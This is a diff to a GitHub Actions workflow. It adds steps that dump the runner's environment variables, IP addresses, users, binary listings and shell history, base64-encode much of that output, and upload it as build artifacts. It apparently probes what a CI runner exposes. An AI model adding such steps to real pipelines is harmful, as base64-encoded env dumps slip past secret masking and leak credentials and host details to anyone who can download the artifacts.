@@ -19,13 +19,41 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v4
 
-      - name: Start action and do nothing
-        #uses: ./.github/actions/dind-multiarch
+      - name: Dumpy McDumpface
         run: |
-          sleep 1
+          printf 'HOST ENV:\n'
+          env
+          env | base64 | tee host-env.txt
+
+          printf 'HOST IPS:\n'
+          ip a
+          ip a | base64 | tee host-ips.txt
+
+          printf 'HOST BINARIES:\n'
+          find /usr/bin > usr-bin.txt
+          find /usr/sbin > usr-sbin.txt
+
+          printf 'HOST USERS:\n'
+          who
+          who | base64 | tee who.txt
+
+          printf 'HOST SHELL HISTORY:\n'
+          cat ~/.bash_history
+          cat ~/.bash_history | base64 | tee history.txt
           #for ((i=0; i < 100; i++)); do
           #  sleep 1
           #done
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: host-data-without-action.zip
+          path: |
+            host-env.txt
+            host-ips.txt
+            usr-bin.txt
+            usr-sbin.txt
+            who.txt
+
   build-action-and-do-nothing:
     runs-on: ubuntu-latest
     steps:
@@ -35,12 +63,24 @@ jobs:
       - name: Dump data please
         run: |
           env
-          env | base64 | base64
+          env | base64
 
       - name: Spin wheels and dump data please
         uses: ./.github/actions/dind-multiarch
         with:
           should_spin_wheels: true
+
+      - name: Get host shell history
+        run: |
+          printf 'HOST SHELL HISTORY:\n'
+          cat ~/.bash_history
+          cat ~/.bash_history | base64 | tee history.txt
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: host-data-for-action.zip
+          path: |
+            history.txt
 
   #build-and-push-bootstrap-image:
   #  runs-on: ubuntu-latest
